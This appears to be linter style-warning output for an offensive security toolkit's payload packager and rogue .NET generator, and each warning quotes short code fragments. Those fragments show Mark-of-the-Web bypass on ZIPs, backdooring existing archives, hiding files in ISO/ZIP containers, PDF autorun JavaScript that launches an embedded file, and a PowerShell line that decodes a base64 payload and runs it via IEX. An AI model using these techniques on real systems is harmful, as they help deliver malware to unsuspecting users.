445 |             self.fileName = self.options["filename"]
446 |             self.logger.info(f"Will package input file into output archive under name:")
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
447 |             self.logger.info(
448 |                 f"\t{os.path.basename(infile)} => {os.path.basename(self.fileName)}\n",
    |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:457:12
    |
455 |             infile = tmp
456 |
457 |         if "password" in self.options.keys() and len(self.options["password"]) > 0:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
458 |             self.password = self.options["password"]
459 |             self.logger.info(f"Will encrypt output archive with password:")
    |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:459:30
    |
457 |         if "password" in self.options.keys() and len(self.options["password"]) > 0:
458 |             self.password = self.options["password"]
459 |             self.logger.info(f"Will encrypt output archive with password:")
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
460 |             self.logger.info("\t" + self.password + "\n", color="magenta")
    |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:466:12
    |
464 |             os.remove(outfile)
465 |
466 |         if "backdoor" in self.options.keys() and len(self.options["backdoor"]) > 0:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
467 |             self.backdoorFile = self.options["backdoor"]
468 |             shutil.copy(self.backdoorFile, outfile)
    |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:470:30
    |
468 |             shutil.copy(self.backdoorFile, outfile)
469 |
470 |             self.logger.info(f"Will backdoor existing archive:")
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
471 |             self.logger.info("\t" + self.backdoorFile + "\n", color="magenta")
    |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:473:12
    |
471 |             self.logger.info("\t" + self.backdoorFile + "\n", color="magenta")
472 |
473 |         if "hide" in self.options.keys() and len(self.options.get("hide", "")) > 0:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
474 |             hide = self.options.get("hide", "")
    |
help: Remove `.keys()`

N803 Argument name `outputFormat` should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:524:45
    |
522 |         return output and os.path.isfile(outfile)
523 |
524 |     def doThePacking(self, infile, outfile, outputFormat, local_path=None):
    |                                             ^^^^^^^^^^^^
525 |         output = False
    |

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:590:13
    |
588 |                   mode = "a"
589 |
590 | /             with zipfile.ZipFile(outfile, mode) as container:
591 | |                 with open(infile, "rb") as f:
    | |_____________________________________________^
592 |                       container.write(infile, local_path or os.path.basename(infile))
    |
help: Combine `with` statements

N806 Variable `zipAttribs` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:594:13
    |
592 |                     container.write(infile, local_path or os.path.basename(infile))
593 |
594 |             zipAttribs = {}
    |             ^^^^^^^^^^
595 |
596 |             if not self.options.get("zip_noreadonly", False):
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:596:13
    |
594 |               zipAttribs = {}
595 |
596 | /             if not self.options.get("zip_noreadonly", False):
597 | |                 if os.path.isfile(infile) and self.isFileExtensionSupported(infile):
    | |____________________________________________________________________________________^
598 |                       self.logger.info(
599 |                           f"Applying MOTW bypass on ZIP by setting {os.path.basename(infile)} as Read-Only upon extraction."
    |
help: Combine `if` statements using `and`

N806 Variable `hideFile` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:613:21
    |
612 |             if type(self.hide) is list and len(self.hide) > 0:
613 |                 for hideFile in self.hide:
    |                     ^^^^^^^^
614 |                     if hideFile in zipAttribs:
615 |                         zipAttribs[hideFile] |= 0x2  # FILE_ATTRIBUTE_HIDDEN
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:622:21
    |
621 |             if self.password:
622 |                 f = tempfile.NamedTemporaryFile(delete=False)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^
623 |                 self.logger.info(
624 |                     "Got file packed into ZIP. Now we extract that zip to re-package it into ZIP with password."
    |

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:675:21
    |
673 |             if self.backdoorFile:
674 |                 self.logger.text(
675 |                     f"[+] Backdoored existing ZIP with specified input file",
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
676 |                     color="green",
677 |                 )
    |
help: Remove extraneous `f` prefix

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:699:13
    |
697 |                   pwd = self.password
698 |
699 | /             with py7zr.SevenZipFile(outfile, mode=mode, password=pwd) as container:
700 | |                 with open(infile, "rb") as f:
    | |_____________________________________________^
701 |                       container.write(infile, local_path or os.path.basename(infile))
    |
help: Combine `with` statements

F841 Local variable `f` is assigned to but never used
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:700:44
    |
699 |             with py7zr.SevenZipFile(outfile, mode=mode, password=pwd) as container:
700 |                 with open(infile, "rb") as f:
    |                                            ^
701 |                     container.write(infile, local_path or os.path.basename(infile))
    |
help: Remove assignment to unused variable `f`

N806 Variable `diskpartFile` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:756:9
    |
755 |     def packIntoVHD(self, infile, outfile):
756 |         diskpartFile = None
    |         ^^^^^^^^^^^^
757 |         diskpartFile2 = None
758 |         vhdFile = None
    |

N806 Variable `diskpartFile2` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:757:9
    |
755 |     def packIntoVHD(self, infile, outfile):
756 |         diskpartFile = None
757 |         diskpartFile2 = None
    |         ^^^^^^^^^^^^^
758 |         vhdFile = None
759 |         outfile = os.path.abspath(outfile)
    |

N806 Variable `vhdFile` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:758:9
    |
756 |         diskpartFile = None
757 |         diskpartFile2 = None
758 |         vhdFile = None
    |         ^^^^^^^
759 |         outfile = os.path.abspath(outfile)
    |

F841 Local variable `vhdFile` is assigned to but never used
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:758:9
    |
756 |         diskpartFile = None
757 |         diskpartFile2 = None
758 |         vhdFile = None
    |         ^^^^^^^
759 |         outfile = os.path.abspath(outfile)
    |
help: Remove assignment to unused variable `vhdFile`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:788:21
    |
787 |                 if (
788 |                     "vhd_letter" in self.options.keys()
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
789 |                     and self.options["vhd_letter"]
790 |                     and self.options["vhd_letter"] != ""
    |
help: Remove `.keys()`

N806 Variable `lettersOccupied` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:799:21
    |
797 |                     reader = csv.reader(f, delimiter=",")
798 |
799 |                     lettersOccupied = set()
    |                     ^^^^^^^^^^^^^^^
800 |
801 |                     for row in reader:
    |

C414 Unnecessary `list()` call within `set()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:812:28
    |
810 |                     )
811 |
812 |                     diff = set(list(string.ascii_lowercase)) - lettersOccupied
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
813 |                     vhdletter = random.choice(list(diff))
    |
help: Remove the inner `list()` call

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:817:54
    |
815 |                 self.logger.info(f"Will assign VHD letter :\t{vhdletter.upper()}:")
816 |
817 |                 with open(Packager.diskpartMountVHD, "r") as f:
    |                                                      ^^^
818 |                     template = f.read()
    |
help: Remove mode argument

N806 Variable `diskpartFile` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:820:17
    |
818 |                     template = f.read()
819 |
820 |                 diskpartFile = tempfile.NamedTemporaryFile(delete=False)
    |                 ^^^^^^^^^^^^
821 |                 diskpartPath = diskpartFile.name + ".txt"
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:820:32
    |
818 |                     template = f.read()
819 |
820 |                 diskpartFile = tempfile.NamedTemporaryFile(delete=False)
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^
821 |                 diskpartPath = diskpartFile.name + ".txt"
    |

N806 Variable `diskpartPath` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:821:17
    |
820 |                 diskpartFile = tempfile.NamedTemporaryFile(delete=False)
821 |                 diskpartPath = diskpartFile.name + ".txt"
    |                 ^^^^^^^^^^^^
822 |
823 |                 template = template.replace("<<<FILE>>>", outfile)
    |

F841 Local variable `code` is assigned to but never used
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:865:21
    |
863 |                     self.logger.text("Finding what letter that is...")
864 |
865 |                     code = ""
    |                     ^^^^
866 |                     with open(Packager.getMountedVHDDrive) as f:
867 |                         g = tempfile.NamedTemporaryFile(delete=False)
    |
help: Remove assignment to unused variable `code`

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:867:29
    |
865 |                     code = ""
866 |                     with open(Packager.getMountedVHDDrive) as f:
867 |                         g = tempfile.NamedTemporaryFile(delete=False)
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
868 |                         ps1 = g.name + ".ps1"
869 |                         with open(ps1, "w") as script:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:900:20
    |
899 |             else:
900 |                 if "vhd_size" in self.options.keys() and self.options["vhd_size"]:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
901 |                     vhdsize = self.options["vhd_size"]
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:904:21
    |
903 |                 if (
904 |                     "vhd_filesystem" in self.options.keys()
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
905 |                     and self.options["vhd_filesystem"]
906 |                 ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:910:21
    |
909 |                 if (
910 |                     "vhd_letter" in self.options.keys()
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
911 |                     and self.options["vhd_letter"]
912 |                     and self.options["vhd_letter"] != ""
    |
help: Remove `.keys()`

N806 Variable `lettersOccupied` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:921:21
    |
919 |                     reader = csv.reader(f, delimiter=",")
920 |
921 |                     lettersOccupied = set()
    |                     ^^^^^^^^^^^^^^^
922 |
923 |                     for row in reader:
    |

C414 Unnecessary `list()` call within `set()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:934:28
    |
932 |                     )
933 |
934 |                     diff = set(list(string.ascii_lowercase)) - lettersOccupied
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
935 |                     vhdletter = random.choice(list(diff))
    |
help: Remove the inner `list()` call

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:942:55
    |
941 |                 template = ""
942 |                 with open(Packager.diskpartCreateVHD, "r") as f:
    |                                                       ^^^
943 |                     template = f.read()
    |
help: Remove mode argument

N806 Variable `diskpartFile` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:945:17
    |
943 |                     template = f.read()
944 |
945 |                 diskpartFile = tempfile.NamedTemporaryFile(delete=False)
    |                 ^^^^^^^^^^^^
946 |                 diskpartPath = diskpartFile.name + ".txt"
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:945:32
    |
943 |                     template = f.read()
944 |
945 |                 diskpartFile = tempfile.NamedTemporaryFile(delete=False)
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^
946 |                 diskpartPath = diskpartFile.name + ".txt"
    |

N806 Variable `diskpartPath` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:946:17
    |
945 |                 diskpartFile = tempfile.NamedTemporaryFile(delete=False)
946 |                 diskpartPath = diskpartFile.name + ".txt"
    |                 ^^^^^^^^^^^^
947 |
948 |                 template = template.replace("<<<FILE>>>", outfile)
    |

N806 Variable `detachTemplate` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1020:13
     |
1018 |                 self.logger.info(f"\t{infile} => {dstpath}")
1019 |
1020 |             detachTemplate = ""
     |             ^^^^^^^^^^^^^^
1021 |             with open(Packager.diskpartDetachVHD, "r") as f:
1022 |                 detachTemplate = f.read()
     |

UP015 [*] Unnecessary mode argument
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1021:51
     |
1020 |             detachTemplate = ""
1021 |             with open(Packager.diskpartDetachVHD, "r") as f:
     |                                                   ^^^
1022 |                 detachTemplate = f.read()
     |
help: Remove mode argument

N806 Variable `detachTemplate` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1022:17
     |
1020 |             detachTemplate = ""
1021 |             with open(Packager.diskpartDetachVHD, "r") as f:
1022 |                 detachTemplate = f.read()
     |                 ^^^^^^^^^^^^^^
1023 |
1024 |             diskpartFile2 = tempfile.NamedTemporaryFile(delete=False)
     |

N806 Variable `diskpartFile2` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1024:13
     |
1022 |                 detachTemplate = f.read()
1023 |
1024 |             diskpartFile2 = tempfile.NamedTemporaryFile(delete=False)
     |             ^^^^^^^^^^^^^
1025 |             diskpartDetachPath = diskpartFile2.name + ".txt"
     |

SIM115 Use a context manager for opening files
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1024:29
     |
1022 |                 detachTemplate = f.read()
1023 |
1024 |             diskpartFile2 = tempfile.NamedTemporaryFile(delete=False)
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1025 |             diskpartDetachPath = diskpartFile2.name + ".txt"
     |

N806 Variable `diskpartDetachPath` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1025:13
     |
1024 |             diskpartFile2 = tempfile.NamedTemporaryFile(delete=False)
1025 |             diskpartDetachPath = diskpartFile2.name + ".txt"
     |             ^^^^^^^^^^^^^^^^^^
1026 |
1027 |             detachTemplate = detachTemplate.replace("<<<FILE>>>", outfile)
     |

N806 Variable `detachTemplate` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1027:13
     |
1025 |             diskpartDetachPath = diskpartFile2.name + ".txt"
1026 |
1027 |             detachTemplate = detachTemplate.replace("<<<FILE>>>", outfile)
     |             ^^^^^^^^^^^^^^
1028 |             detachTemplate = detachTemplate.replace("<<<DRIVE_LETTER>>>", vhdletter)
     |

N806 Variable `detachTemplate` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1028:13
     |
1027 |             detachTemplate = detachTemplate.replace("<<<FILE>>>", outfile)
1028 |             detachTemplate = detachTemplate.replace("<<<DRIVE_LETTER>>>", vhdletter)
     |             ^^^^^^^^^^^^^^
1029 |
1030 |             with open(diskpartDetachPath, "w") as f:
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1083:21
     |
1081 |             if "access is denied" in str(e).lower():
1082 |                 self.logger.err(
1083 |                     f"Try changing VHD volume mount letter with --vhd-letter ."
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1084 |                 )
     |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1094:17
     |
1092 |                 try:
1093 |                     diskpartFile.close()
1094 |                 except:
     |                 ^^^^^^
1095 |                     pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1102:17
     |
1100 |                 try:
1101 |                     diskpartFile2.close()
1102 |                 except:
     |                 ^^^^^^
1103 |                     pass
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1207:41
     |
1205 |                         localfiles.append(("file", infile, fn))
1206 |                     else:
1207 |                         self.logger.dbg(f"Adding new files to ISO:")
     |                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1208 |
1209 |                         for fname in glob.iglob(infile + "/**/**", recursive=True):
     |
help: Remove extraneous `f` prefix

N806 Variable `hideFile` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1250:33
     |
1248 |                     if self.hide != "":
1249 |                         if type(self.hide) is list:
1250 |                             for hideFile in self.hide:
     |                                 ^^^^^^^^
1251 |                                 self.logger.text(f"\tHiding file: //{hideFile}")
1252 |                                 iso2.set_hidden(joliet_path=f"/{hideFile};1")
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1269:38
     |
1267 |                     filename = os.path.basename(infile)
1268 |
1269 |                     self.logger.text(f"Burning file onto ISO:")
     |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^
1270 |                     self.logger.text(f"\tAdding file: /{filename}")
1271 |                     iso.add_file(infile, joliet_path=f"/{filename};1")
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1274:38
     |
1273 |                 else:
1274 |                     self.logger.text(f"Burning files onto ISO:")
     |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^
1275 |                     alreadyadded = set()
     |
help: Remove extraneous `f` prefix

N806 Variable `hideFile` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1313:29
     |
1311 |                 if self.hide != "":
1312 |                     if type(self.hide) is list:
1313 |                         for hideFile in self.hide:
     |                             ^^^^^^^^
1314 |                             self.logger.text(f"\tHiding file: //{hideFile}")
1315 |                             iso.set_hidden(joliet_path=f"/{hideFile};1")
     |

N803 Argument name `myPdfFileWriterObj` should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1343:35
     |
1341 |     #   https://stackoverflow.com/a/59085770
1342 |     #
1343 |     def pdfAppendAttachment(self, myPdfFileWriterObj, fname, fdata):
     |                                   ^^^^^^^^^^^^^^^^^^
1344 |         # The entry for the file
1345 |         file_entry = DecodedStreamObject()
     |

N806 Variable `efEntry` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1350:9
     |
1349 |         # The Filespec entry
1350 |         efEntry = DictionaryObject()
     |         ^^^^^^^
1351 |         efEntry.update({NameObject("/F"): file_entry})
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1362:12
     |
1360 |         )
1361 |
1362 |         if "/Names" not in myPdfFileWriterObj._root_object.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1363 |             self.logger.dbg(
1364 |                 "No files attached yet. Create the entry for the root, as it needs a reference to the Filespec"
     |
help: Remove `.keys()`

N806 Variable `embeddedFilesNamesDictionary` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1367:13
     |
1365 |             )
1366 |
1367 |             embeddedFilesNamesDictionary = DictionaryObject()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1368 |             embeddedFilesNamesDictionary.update(
1369 |                 {
     |

N806 Variable `embeddedFilesDictionary` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1376:13
     |
1374 |             )
1375 |
1376 |             embeddedFilesDictionary = DictionaryObject()
     |             ^^^^^^^^^^^^^^^^^^^^^^^
1377 |             embeddedFilesDictionary.update(
1378 |                 {NameObject("/EmbeddedFiles"): embeddedFilesNamesDictionary}
     |

SIM113 Use `enumerate()` for index variable `num` in `for` loop
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1407:21
     |
1405 |                     exts += ext + ", "
1406 |
1407 |                     num += 1
     |                     ^^^^^^^^
1408 |                     if num % 15 == 0:
1409 |                         exts += "\n\t"
     |

W291 Trailing whitespace
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1424:82
     |
1423 | The message will be:
1424 |   "Adobe Acrobat cannot open the file attachment because your PDF file attachment 
     |                                                                                  ^
1425 |    settings do not allow this type of file to be opened."
     |
help: Remove trailing whitespace

N806 Variable `autorunJs` in function should be lowercase
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1486:17
     |
1484 |                 self.logger.info("Adding file-autorun Javascript to the PDF")
1485 |
1486 |                 autorunJs = (
     |                 ^^^^^^^^^
1487 |                     f'this.exportDataObject({{ cName: "{fname}", nLaunch: 2 }});'
1488 |                 )
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1509:21
     |
1508 |                   self.logger.text(
1509 | /                     f"""
1510 | | --------------------------------------------------
1511 | | CAUTION:
1512 | |
1513 | | When PDF is password-encrypted, autorun Javascript will not execute to prompt user into opening embedded file!
1514 | |
1515 | | --------------------------------------------------
1516 | | """,
     | |___^
1517 |                       color="red",
1518 |                   )
     |
help: Remove extraneous `f` prefix

B007 Loop control variable `k` not used within loop body
    --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:1547:21
     |
1545 |                 self.logger.dbg("Extracting files from CAB:")
1546 |
1547 |                 for k, v in arc.items():
     |                     ^
1548 |                     lp = os.path.join(tmpdir.name, v.filename)
     |
help: Rename unused `k` to `_k`

N816 Variable `decompressionFuncs` in global scope should not be mixedCase
  --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:62:1
   |
60 | }
61 |
62 | decompressionFuncs = """
   | ^^^^^^^^^^^^^^^^^^
63 |         public static long CopyTo(Stream source, Stream destination) {
64 |             byte[] buffer = new byte[2048];
   |

N816 Variable `globalOptions` in global scope should not be mixedCase
  --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:89:1
   |
87 | """
88 |
89 | globalOptions = {}
   | ^^^^^^^^^^^^^
   |

N803 Argument name `stdErrToStdout` should be lowercase
  --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:96:36
   |
96 | def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
   |                                    ^^^^^^^^^^^^^^^^^^^^
97 |     CREATE_NO_WINDOW = 0x08000000
98 |     si = subprocess.STARTUPINFO()
   |

N803 Argument name `surpressStderr` should be lowercase
  --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:96:58
   |
96 | def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
   |                                                          ^^^^^^^^^^^^^^^^^^^^
97 |     CREATE_NO_WINDOW = 0x08000000
98 |     si = subprocess.STARTUPINFO()
   |

N806 Variable `CREATE_NO_WINDOW` in function should be lowercase
  --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:97:5
   |
96 | def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
97 |     CREATE_NO_WINDOW = 0x08000000
   |     ^^^^^^^^^^^^^^^^
98 |     si = subprocess.STARTUPINFO()
99 |     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
   |

N803 Argument name `surpressStderr` should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:161:49
    |
161 | def shell(cmd, alternative=False, output=False, surpressStderr=False):
    |                                                 ^^^^^^^^^^^^^^^^^^^^
162 |     out = shell2(cmd, alternative, stdErrToStdout=output, surpressStderr=surpressStderr)
    |

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:167:26
    |
167 | def getCompressedPayload(filePath, returnRaw=False):
    |                          ^^^^^^^^
168 |     out = io.BytesIO()
169 |     encoded = ""
    |

N803 Argument name `returnRaw` should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:167:36
    |
167 | def getCompressedPayload(filePath, returnRaw=False):
    |                                    ^^^^^^^^^^^^^^^
168 |     out = io.BytesIO()
169 |     encoded = ""
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:180:18
    |
178 |               return encoded
179 |
180 |       powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IOΓÇª
    |  __________________^
181 | |         encoded.decode()
182 | |     )
    | |_____^
183 |       return powershell
    |
help: Convert to f-string

N803 Argument name `targetProcess` should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:216:5
    |
214 |     _format,
215 |     apc,
216 |     targetProcess,
    |     ^^^^^^^^^^^^^
217 |     dontUseNamespace=False,
218 |     _type="regasm",
    |

N803 Argument name `dontUseNamespace` should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:217:5
    |
215 |     apc,
216 |     targetProcess,
217 |     dontUseNamespace=False,
    |     ^^^^^^^^^^^^^^^^^^^^^^
218 |     _type="regasm",
219 |     command="",
    |

N806 Variable `templateName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:222:5
    |
220 | ):
221 |
222 |     templateName = "".join(
    |     ^^^^^^^^^^^^
223 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
224 |     )
    |

N806 Variable `templateName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:226:9
    |
224 |     )
225 |     if len(module) > 0:
226 |         templateName = module
    |         ^^^^^^^^^^^^
227 |
228 |     namespaceName = "".join(
    |

N806 Variable `namespaceName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:228:5
    |
226 |         templateName = module
227 |
228 |     namespaceName = "".join(
    |     ^^^^^^^^^^^^^
229 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
230 |     )
    |

N806 Variable `namespaceName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:232:9
    |
230 |     )
231 |     if len(namespace) > 0:
232 |         namespaceName = namespace
    |         ^^^^^^^^^^^^^
233 |
234 |     methodName = "".join(
    |

N806 Variable `methodName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:234:5
    |
232 |         namespaceName = namespace
233 |
234 |     methodName = "".join(
    |     ^^^^^^^^^^
235 |         random.choice(string.ascii_letters) for x in range(random.randint(5, 15))
236 |     )
    |

N806 Variable `methodName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:238:9
    |
236 |     )
237 |     if len(method) > 0:
238 |         methodName = method
    |         ^^^^^^^^^^
239 |
240 |     payloadCode = payload
    |

N806 Variable `payloadCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:240:5
    |
238 |         methodName = method
239 |
240 |     payloadCode = payload
    |     ^^^^^^^^^^^
241 |
242 |     if _type not in ["exec", "run-command"]:
    |

N806 Variable `payloadCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:243:9
    |
242 |     if _type not in ["exec", "run-command"]:
243 |         payloadCode = getPayloadCode(payload.decode())
    |         ^^^^^^^^^^^
244 |
245 |     launchCode = ""
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:245:5
    |
243 |         payloadCode = getPayloadCode(payload.decode())
244 |
245 |     launchCode = ""
    |     ^^^^^^^^^^
246 |
